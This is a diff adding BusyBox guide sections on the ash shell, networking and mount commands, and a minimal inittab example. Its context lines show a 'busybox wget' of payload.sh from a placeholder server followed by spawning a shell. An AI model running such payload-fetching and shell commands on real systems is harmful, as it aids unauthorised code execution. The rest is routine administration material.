@@ -118,3 +118,47 @@ busybox wget http://yourserver/payload.sh
 # Get a shell
 busybox sh
 ```
+
+#### Busybox Shell :
+
+ash (Almquist shell — POSIX-compliant, lightweight)
+
+💡 Tip: Some GNU command options may not exist in BusyBox.
+
+### System Administration with BusyBox :
+
+```bash
+# Configure networking
+ifconfig eth0 192.168.1.10 netmask 255.255.255.0 up
+route add default gw 192.168.1.1
+
+# Mount/umount
+mount -t ext4 /dev/sda1 /mnt
+umount /mnt
+
+# Edit config files
+vi /etc/network/interfaces
+
+# View logs
+dmesg
+logread
+
+```
+
+####  BusyBox Init System :
+
+BusyBox provides a minimal init system.
+
+Key files:
+
+/etc/inittab — init configuration
+
+/etc/init.d/ — service scripts
+
+Example /etc/inittab snippet:
+```bash
+::sysinit:/etc/init.d/rcS
+tty1::respawn:/bin/ash
+::ctrlaltdel:/sbin/reboot
+
+```
